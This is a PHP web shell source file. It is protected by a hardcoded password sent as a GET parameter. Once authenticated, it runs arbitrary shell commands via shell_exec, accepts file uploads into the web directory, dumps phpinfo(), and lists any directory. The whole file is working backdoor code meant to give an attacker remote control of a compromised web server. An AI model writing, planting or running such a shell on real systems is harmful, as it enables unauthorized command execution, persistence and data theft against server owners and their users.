<?php
// Configurable Password
$password = 'securepassword'; // Change this to a strong password

if (isset($_GET['password']) && $_GET['password'] === $password) {
    if (isset($_GET['action'])) {
        switch ($_GET['action']) {
            case 'cmd': // Execute a shell command
                if (isset($_GET['cmd'])) {
                    $cmd = $_GET['cmd'];
                    echo "<pre>" . shell_exec($cmd) . "</pre>";
                } else {
                    echo "Command not provided. Use ?action=cmd&cmd=<your_command>";
                }
                break;

            case 'upload': // File upload handler
                if (isset($_FILES['file'])) {
                    $upload_dir = getcwd(); // Upload to the current directory
                    $upload_file = $upload_dir . '/' . basename($_FILES['file']['name']);
                    if (move_uploaded_file($_FILES['file']['tmp_name'], $upload_file)) {
                        echo "File uploaded successfully: $upload_file";
                    } else {
                        echo "Failed to upload file.";
                    }
                } else {
                    echo '<form method="POST" enctype="multipart/form-data">
                            <input type="file" name="file">
                            <input type="submit" value="Upload">
                          </form>';
                }
                break;

            case 'phpinfo': // Display PHP information
                phpinfo();
                break;

            case 'list': // List files in a directory
                $dir = isset($_GET['dir']) ? $_GET['dir'] : getcwd();
                if (is_dir($dir)) {
                    $files = scandir($dir);
                    echo "<pre>" . implode("\n", $files) . "</pre>";
                } else {
                    echo "Invalid directory.";
                }
                break;

            default:
                echo "Invalid action. Supported actions: cmd, upload, phpinfo, list.";
                break;
        }
    } else {
        echo "No action provided. Use ?action=<action>. Supported actions: cmd, upload, phpinfo, list.";
    }
} else {
    header('HTTP/1.0 403 Forbidden');
    echo "Unauthorized access.";
}
?>
